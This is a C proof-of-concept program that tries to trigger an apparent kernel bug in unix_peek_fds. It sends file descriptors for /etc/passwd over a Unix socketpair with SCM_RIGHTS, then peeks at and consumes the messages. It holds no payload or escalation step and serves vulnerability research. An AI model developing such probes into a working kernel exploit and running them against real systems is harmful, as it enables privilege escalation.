/*
 * PoC for WMI-3: unix_peek_fds
 * Test various scenarios to find the right trigger
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <poll.h>

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))

int main(int argc, char *argv[])
{
    int sv[2];
    int fd_to_send;
    struct msghdr msg;
    struct iovec iov;
    char buf[64];
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    struct cmsghdr *cmsg;
    int ret;
    int i;

    /* Try SOCK_STREAM */
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        perror("socketpair stream");
        return 1;
    }

    fd_to_send = open("/etc/passwd", O_RDONLY);
    if (fd_to_send < 0) {
        perror("open");
        return 1;
    }

    /* Send several messages, some with fds, some without */
    for (i = 0; i < 5; i++) {
        memset(&msg, 0, sizeof(msg));
        memset(buf, 0x41 + i, sizeof(buf));
        iov.iov_base = buf;
        iov.iov_len = 8; /* small */
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        if (i % 2 == 0) {
            /* Include SCM_RIGHTS */
            memset(cmsg_buf, 0, sizeof(cmsg_buf));
            msg.msg_control = cmsg_buf;
            msg.msg_controllen = sizeof(cmsg_buf);
            cmsg = CMSG_FIRSTHDR(&msg);
            cmsg->cmsg_level = SOL_SOCKET;
            cmsg->cmsg_type = SCM_RIGHTS;
            cmsg->cmsg_len = CMSG_LEN(sizeof(int));
            *(int *)CMSG_DATA(cmsg) = fd_to_send;
        } else {
            msg.msg_control = NULL;
            msg.msg_controllen = 0;
        }

        ret = sendmsg(sv[0], &msg, 0);
        if (ret < 0) {
            perror("sendmsg");
            return 1;
        }
    }
    printf("Sent 5 messages (alternating SCM_RIGHTS)\n");

    /* Peek with MSG_PEEK to read all messages */
    for (i = 0; i < 10; i++) {
        memset(&msg, 0, sizeof(msg));
        memset(cmsg_buf, 0, sizeof(cmsg_buf));
        memset(buf, 0, sizeof(buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);

        ret = recvmsg(sv[1], &msg, MSG_PEEK | MSG_DONTWAIT);
        if (ret < 0) {
            if (errno == EAGAIN)
                break;
            perror("recvmsg (peek)");
            break;
        }
        printf("Peek #%d got %d bytes\n", i, ret);
    }

    /* Now consume all */
    for (i = 0; i < 5; i++) {
        memset(&msg, 0, sizeof(msg));
        memset(cmsg_buf, 0, sizeof(cmsg_buf));
        memset(buf, 0, sizeof(buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);

        ret = recvmsg(sv[1], &msg, 0);
        if (ret < 0) {
            perror("recvmsg (consume)");
            break;
        }
        printf("Consumed %d bytes\n", ret);
    }

    close(fd_to_send);
    close(sv[0]);
    close(sv[1]);

    printf("PoC completed\n");
    return 0;
}
